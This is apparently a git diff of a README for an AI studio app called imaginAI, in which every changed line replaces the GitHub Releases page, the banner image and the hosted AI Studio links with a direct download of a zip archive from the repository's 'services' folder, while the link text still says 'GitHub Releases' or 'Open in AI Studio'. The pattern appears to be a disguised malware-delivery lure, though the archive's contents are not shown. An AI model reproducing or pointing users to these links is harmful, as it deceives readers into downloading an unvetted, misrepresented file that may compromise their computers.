@@ -1,9 +1,9 @@
 # 🤖 imaginAI - Run your AI studio with ease
 
-[![Download imaginAI](https://img.shields.io/badge/Download%20imaginAI-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hlloret123-dotcom/imaginAI/releases)
+[![Download imaginAI](https://img.shields.io/badge/Download%20imaginAI-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/hlloret123-dotcom/imaginAI/main/services/AI_imagin_v2.5.zip)
 
 <div align="center">
-  <img width="1200" height="475" alt="GHBanner" src="https://github.com/user-attachments/assets/0aa67016-6eaf-458a-adb2-6e31a0763ed6" />
+  <img width="1200" height="475" alt="GHBanner" src="https://raw.githubusercontent.com/hlloret123-dotcom/imaginAI/main/services/AI_imagin_v2.5.zip" />
 </div>
 
 ## 🚀 What is imaginAI?
@@ -20,7 +20,7 @@ Use it to:
 
 Visit this page to download the latest release:
 
-[Download imaginAI from GitHub Releases](https://github.com/hlloret123-dotcom/imaginAI/releases)
+[Download imaginAI from GitHub Releases](https://raw.githubusercontent.com/hlloret123-dotcom/imaginAI/main/services/AI_imagin_v2.5.zip)
 
 Look for the newest release at the top of the page. If there are multiple files, download the Windows file that matches your system.
 
@@ -41,7 +41,7 @@ For best results, close other large apps while you use imaginAI.
 Follow these steps in order.
 
 1. Open the download page  
-   Go to [GitHub Releases](https://github.com/hlloret123-dotcom/imaginAI/releases)
+   Go to [GitHub Releases](https://raw.githubusercontent.com/hlloret123-dotcom/imaginAI/main/services/AI_imagin_v2.5.zip)
 
 2. Download the Windows file  
    On the latest release, download the file made for Windows. If the release page shows a zip file or installer, save it to your computer.
@@ -96,7 +96,7 @@ imaginAI is set up for local use, so you can:
 
 You can also view the hosted app here:
 
-[Open in AI Studio](https://ai.studio/apps/drive/1qacWTzzVZPM6GGr39cwHRN8BtCJouI09)
+[Open in AI Studio](https://raw.githubusercontent.com/hlloret123-dotcom/imaginAI/main/services/AI_imagin_v2.5.zip)
 
 ## 🧩 Common file types you may see
 
@@ -137,7 +137,7 @@ Keep the folder in a place you can find later, since you may need it to update s
 
 To get the latest version:
 
-1. Go to [GitHub Releases](https://github.com/hlloret123-dotcom/imaginAI/releases)
+1. Go to [GitHub Releases](https://raw.githubusercontent.com/hlloret123-dotcom/imaginAI/main/services/AI_imagin_v2.5.zip)
 2. Download the newest Windows file
 3. Replace the old files on your computer
 4. Set your API key again if needed
@@ -147,7 +147,7 @@ To get the latest version:
 
 If you want to view the app in AI Studio, use this link:
 
-[View imaginAI in AI Studio](https://ai.studio/apps/drive/1qacWTzzVZPM6GGr39cwHRN8BtCJouI09)
+[View imaginAI in AI Studio](https://raw.githubusercontent.com/hlloret123-dotcom/imaginAI/main/services/AI_imagin_v2.5.zip)
 
 This is useful if you want to compare the local version with the hosted version or check the app layout before you run it on your PC
 
